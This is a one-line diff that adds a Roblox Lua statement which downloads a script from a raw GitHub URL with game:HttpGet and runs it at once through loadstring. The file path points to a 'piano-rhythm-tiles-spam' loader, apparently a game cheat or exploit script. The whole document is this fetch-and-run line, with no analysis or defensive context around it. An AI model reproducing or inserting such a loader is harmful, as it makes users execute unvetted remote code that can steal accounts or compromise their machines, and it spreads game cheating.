@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/piano-rhythm-tiles-spam5-se66pfgeo5098w.lua"))()
